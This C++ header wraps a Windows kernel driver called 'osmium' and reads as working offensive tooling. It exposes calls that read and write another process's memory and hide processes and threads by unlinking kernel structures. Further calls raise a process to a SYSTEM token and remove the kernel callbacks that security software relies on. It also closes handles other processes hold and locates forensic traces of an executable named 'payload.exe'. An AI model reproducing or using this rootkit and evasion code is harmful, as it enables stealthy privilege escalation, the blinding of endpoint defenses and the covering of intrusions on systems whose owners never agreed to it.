#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <cstdint>
#include <memory>
#include <vector>
#include <optional>

#include "../../Driver/Shared/ioctl.h"

/* -----------------------------------------------------------------------
 * RAII handle wrapper — std::unique_ptr with a custom deleter for HANDLE
 * ----------------------------------------------------------------------- */

struct handle_deleter
{
	using pointer = HANDLE;

	void operator()( HANDLE h ) const noexcept
	{
		if( h && h != INVALID_HANDLE_VALUE )
			CloseHandle( h );
	}
};

using unique_handle = std::unique_ptr< void, handle_deleter >;

/* -----------------------------------------------------------------------
 * Return types for collection-based APIs
 * ----------------------------------------------------------------------- */

struct callback_info
{
	ULONG          index;
	std::uintptr_t address;
};

struct artifact_info
{
	ULONG        type;
	std::wstring path;
};

/* -----------------------------------------------------------------------
 * driver_interface — user-mode C++ wrapper for the osmium kernel driver
 * ----------------------------------------------------------------------- */

class driver_interface
{
public:
	///-------------------------------------------------------------------------------------------------
	/// <summary>Default constructor. Opens a handle to the kernel driver device.</summary>
	///-------------------------------------------------------------------------------------------------

	driver_interface()
		: m_handle( nullptr )
		, m_pid( 0 )
	{
		auto h = CreateFileW(
			OSMIUM_WIN32_DEVICE,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			nullptr
		);

		if( h != INVALID_HANDLE_VALUE )
			m_handle.reset( h );
	}

	~driver_interface() = default;

	driver_interface( const driver_interface& ) = delete;
	driver_interface& operator=( const driver_interface& ) = delete;
	driver_interface( driver_interface&& ) noexcept = default;
	driver_interface& operator=( driver_interface&& ) noexcept = default;

	///-------------------------------------------------------------------------------------------------
	/// <summary>Checks if the driver handle is valid and communication is possible.</summary>
	///
	/// <returns>True if connected to the driver, false otherwise.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] bool is_connected() const noexcept
	{
		return m_handle.get() != nullptr && m_handle.get() != INVALID_HANDLE_VALUE;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Attaches to a target process by process ID.</summary>
	///
	/// <param name="pid">The process ID of the target process.</param>
	///-------------------------------------------------------------------------------------------------

	void attach( DWORD pid ) noexcept
	{
		m_pid = pid;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Attaches to a target process by name (finds first matching PID).</summary>
	///
	/// <param name="process_name">The process executable name (e.g. L"target.exe").</param>
	///
	/// <returns>True if the process was found and attached, false otherwise.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] bool attach( const std::wstring& process_name )
	{
		if( process_name.empty() )
			return false;

		auto raw = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
		if( raw == INVALID_HANDLE_VALUE )
			return false;

		unique_handle snapshot{ raw };

		PROCESSENTRY32W pe32 = {};
		pe32.dwSize = sizeof( PROCESSENTRY32W );

		if( Process32FirstW( snapshot.get(), &pe32 ) )
		{
			do
			{
				if( std::wstring( pe32.szExeFile ) == process_name )
				{
					m_pid = pe32.th32ProcessID;
					return true;
				}
			}
			while( Process32NextW( snapshot.get(), &pe32 ) );
		}

		return false;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Gets the currently attached process ID.</summary>
	///
	/// <returns>The process ID, or 0 if not attached.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] DWORD get_pid() const noexcept
	{
		return m_pid;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Reads a value of type T from the target process memory.</summary>
	///
	/// <typeparam name="T">The type to read.</typeparam>
	/// <param name="address">The virtual address to read from in the target process.</param>
	///
	/// <returns>The value read from memory.</returns>
	///-------------------------------------------------------------------------------------------------

	template< typename T >
	T read( const std::uintptr_t address )
	{
		T buffer{};
		read_buffer( address, &buffer, sizeof( T ) );
		return buffer;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Writes a value of type T to the target process memory.</summary>
	///
	/// <typeparam name="T">The type to write.</typeparam>
	/// <param name="address">The virtual address to write to in the target process.</param>
	/// <param name="value">The value to write.</param>
	///
	/// <returns>True if the write succeeded, false otherwise.</returns>
	///-------------------------------------------------------------------------------------------------

	template< typename T >
	bool write( std::uintptr_t address, T value )
	{
		return write_buffer( address, &value, sizeof( T ) );
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Reads raw bytes from the target process memory into a caller-supplied buffer.</summary>
	///
	/// <param name="address">The virtual address to read from.</param>
	/// <param name="buffer">Pointer to the destination buffer.</param>
	/// <param name="size">Number of bytes to read.</param>
	///
	/// <returns>True if the read succeeded, false otherwise.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] bool read_buffer( const std::uintptr_t address, void* buffer, const size_t size )
	{
		if( !is_connected() || !buffer || size == 0 )
			return false;

		MEMORY_REQUEST request = {};
		request.ProcessId = static_cast< ULONG64 >( m_pid );
		request.Address   = static_cast< ULONG64 >( address );
		request.Buffer    = reinterpret_cast< ULONG64 >( buffer );
		request.Size      = static_cast< ULONG64 >( size );

		MEMORY_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_READ_MEMORY,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		return success && response.Status == 0;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Writes raw bytes from a caller-supplied buffer to the target process memory.</summary>
	///
	/// <param name="address">The virtual address to write to.</param>
	/// <param name="buffer">Pointer to the source buffer.</param>
	/// <param name="size">Number of bytes to write.</param>
	///
	/// <returns>True if the write succeeded, false otherwise.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] bool write_buffer( const std::uintptr_t address, const void* buffer, const size_t size )
	{
		if( !is_connected() || !buffer || size == 0 )
			return false;

		MEMORY_REQUEST request = {};
		request.ProcessId = static_cast< ULONG64 >( m_pid );
		request.Address   = static_cast< ULONG64 >( address );
		request.Buffer    = reinterpret_cast< ULONG64 >( const_cast< void* >( buffer ) );
		request.Size      = static_cast< ULONG64 >( size );

		MEMORY_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_WRITE_MEMORY,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		return success && response.Status == 0;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Retrieves the base address of the main executable of a process.</summary>
	///
	/// <param name="pid">The process ID. If 0, uses the currently attached PID.</param>
	///
	/// <returns>The base address, or 0 on failure.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] std::uintptr_t get_process_base( DWORD pid = 0 )
	{
		if( !is_connected() )
			return 0;

		if( pid == 0 )
			pid = m_pid;

		PROCESS_BASE_REQUEST request = {};
		request.ProcessId = static_cast< ULONG64 >( pid );

		PROCESS_BASE_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_GET_PROCESS_BASE,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		if( !success || response.Status != 0 )
			return 0;

		return static_cast< std::uintptr_t >( response.BaseAddress );
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Retrieves the base address and size of a loaded module by name.</summary>
	///
	/// <param name="module_name">The module name (e.g. L"ntdll.dll").</param>
	/// <param name="pid">The process ID. If 0, uses the currently attached PID.</param>
	/// <param name="out_size">Optional pointer to receive the module size.</param>
	///
	/// <returns>The module base address, or 0 on failure.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] std::uintptr_t get_module_base( const std::wstring& module_name, DWORD pid = 0, size_t* out_size = nullptr )
	{
		if( !is_connected() || module_name.empty() )
			return 0;

		if( pid == 0 )
			pid = m_pid;

		MODULE_BASE_REQUEST request = {};
		request.ProcessId = static_cast< ULONG64 >( pid );

		const auto copy_len = min( module_name.size(), MAX_MODULE_NAME_LENGTH - 1 );
		memcpy( request.ModuleName, module_name.c_str(), copy_len * sizeof( WCHAR ) );
		request.ModuleName[copy_len] = L'\0';

		MODULE_BASE_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_GET_MODULE_BASE,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		if( !success || response.Status != 0 )
			return 0;

		if( out_size )
			*out_size = static_cast< size_t >( response.ModuleSize );

		return static_cast< std::uintptr_t >( response.BaseAddress );
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Hides a process from Task Manager by unlinking its EPROCESS from
	///          the ActiveProcessLinks list (DKOM).</summary>
	///
	/// <param name="pid">The process ID to hide. If 0, uses the currently attached PID.</param>
	///
	/// <returns>True if the process was successfully hidden, false otherwise.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] bool hide_process( DWORD pid = 0 )
	{
		if( !is_connected() )
			return false;

		if( pid == 0 )
			pid = m_pid;

		HIDE_PROCESS_REQUEST request = {};
		request.ProcessId = static_cast< ULONG64 >( pid );

		HIDE_PROCESS_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_HIDE_PROCESS,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		return success && response.Status == 0;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Elevates a process to NT AUTHORITY\SYSTEM by copying the system
	///          token into the target process's EPROCESS Token field.</summary>
	///
	/// <param name="pid">The process ID to elevate. If 0, uses the currently attached PID.</param>
	///
	/// <returns>True if the token was successfully replaced, false otherwise.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] bool elevate_token( DWORD pid = 0 )
	{
		if( !is_connected() )
			return false;

		if( pid == 0 )
			pid = m_pid;

		ELEVATE_TOKEN_REQUEST request = {};
		request.ProcessId = static_cast< ULONG64 >( pid );

		ELEVATE_TOKEN_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_ELEVATE_TOKEN,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		return success && response.Status == 0;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Hides all threads of a process by unlinking them from EPROCESS
	///          ThreadListHead.</summary>
	///
	/// <param name="pid">The process ID. If 0, uses the currently attached PID.</param>
	///
	/// <returns>Number of threads hidden on success, std::nullopt on failure.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] std::optional< ULONG > hide_threads( DWORD pid = 0 )
	{
		if( !is_connected() )
			return std::nullopt;

		if( pid == 0 )
			pid = m_pid;

		HIDE_THREADS_REQUEST request = {};
		request.ProcessId = static_cast< ULONG64 >( pid );

		HIDE_THREADS_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_HIDE_THREADS,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		if( !success || response.Status != 0 )
			return std::nullopt;

		return response.ThreadsHidden;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Enumerates registered kernel notification callbacks (process, thread,
	///          or image load).</summary>
	///
	/// <param name="type">CALLBACK_TYPE_PROCESS (0), CALLBACK_TYPE_THREAD (1),
	///                     or CALLBACK_TYPE_IMAGE (2).</param>
	///
	/// <returns>Vector of callback_info on success, std::nullopt on failure.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] std::optional< std::vector< callback_info > > enum_callbacks( ULONG type )
	{
		if( !is_connected() )
			return std::nullopt;

		ENUM_CALLBACKS_REQUEST request = {};
		request.CallbackType = type;

		ENUM_CALLBACKS_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_ENUM_CALLBACKS,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		if( !success || response.Status != 0 )
			return std::nullopt;

		std::vector< callback_info > result;
		result.reserve( response.Count );

		for( ULONG i = 0; i < response.Count; i++ )
		{
			result.push_back( {
				response.Entries[i].Index,
				static_cast< std::uintptr_t >( response.Entries[i].Address )
			} );
		}

		return result;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Removes a single kernel notification callback by type and array index.
	///          Use enum_callbacks() first to discover the index.</summary>
	///
	/// <param name="type">CALLBACK_TYPE_PROCESS (0), CALLBACK_TYPE_THREAD (1),
	///                     or CALLBACK_TYPE_IMAGE (2).</param>
	/// <param name="index">The array index of the callback to remove.</param>
	///
	/// <returns>True if the callback was successfully removed, false otherwise.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] bool remove_callback( ULONG type, ULONG index )
	{
		if( !is_connected() )
			return false;

		REMOVE_CALLBACK_REQUEST request = {};
		request.CallbackType = type;
		request.Index = index;

		REMOVE_CALLBACK_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_REMOVE_CALLBACK,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		return success && response.Status == 0;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Removes all registered callbacks of a given type.</summary>
	///
	/// <param name="type">CALLBACK_TYPE_PROCESS (0), CALLBACK_TYPE_THREAD (1),
	///                     or CALLBACK_TYPE_IMAGE (2).</param>
	///
	/// <returns>Number of callbacks removed on success, std::nullopt on failure.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] std::optional< ULONG > remove_all_callbacks( ULONG type )
	{
		auto callbacks = enum_callbacks( type );
		if( !callbacks )
			return std::nullopt;

		ULONG removed = 0;

		for( const auto& cb : *callbacks )
		{
			if( remove_callback( type, cb.index ) )
				removed++;
		}

		return removed;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Strips (closes) all handles to a process held by other processes.</summary>
	///
	/// <param name="pid">The process ID. If 0, uses the currently attached PID.</param>
	///
	/// <returns>Number of handles stripped on success, std::nullopt on failure.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] std::optional< ULONG > strip_handles( DWORD pid = 0 )
	{
		if( !is_connected() )
			return std::nullopt;

		if( pid == 0 )
			pid = m_pid;

		STRIP_HANDLES_REQUEST request = {};
		request.ProcessId = static_cast< ULONG64 >( pid );

		STRIP_HANDLES_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_STRIP_HANDLES,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		if( !success || response.Status != 0 )
			return std::nullopt;

		return response.HandlesStripped;
	}

	///-------------------------------------------------------------------------------------------------
	/// <summary>Scans for forensic execution artifacts left by a given executable.
	///          Searches Prefetch files, ShimCache, BAM entries, and AmCache.</summary>
	///
	/// <param name="executable_name">The executable filename (e.g. L"payload.exe").</param>
	/// <param name="artifact_types">Bitmask of ARTIFACT_TYPE_* (default: ARTIFACT_TYPE_ALL).</param>
	///
	/// <returns>Vector of artifact_info on success, std::nullopt on failure.</returns>
	///-------------------------------------------------------------------------------------------------

	[[nodiscard]] std::optional< std::vector< artifact_info > > scan_artifacts(
		const std::wstring& executable_name,
		ULONG artifact_types = ARTIFACT_TYPE_ALL
	)
	{
		if( !is_connected() || executable_name.empty() )
			return std::nullopt;

		SCAN_ARTIFACTS_REQUEST request = {};
		request.ArtifactTypes = artifact_types;

		const auto copy_len = min( executable_name.size(), MAX_MODULE_NAME_LENGTH - 1 );
		memcpy( request.ExecutableName, executable_name.c_str(), copy_len * sizeof( WCHAR ) );
		request.ExecutableName[copy_len] = L'\0';

		SCAN_ARTIFACTS_RESPONSE response = {};
		DWORD bytes_returned = 0;

		const auto success = DeviceIoControl(
			m_handle.get(),
			IOCTL_SCAN_ARTIFACTS,
			&request,
			sizeof( request ),
			&response,
			sizeof( response ),
			&bytes_returned,
			nullptr
		);

		if( !success || response.Status != 0 )
			return std::nullopt;

		std::vector< artifact_info > result;
		result.reserve( response.Count );

		for( ULONG i = 0; i < response.Count; i++ )
		{
			result.push_back( {
				response.Entries[i].Type,
				std::wstring( response.Entries[i].Path )
			} );
		}

		return result;
	}

private:
	unique_handle m_handle;
	DWORD         m_pid;
};
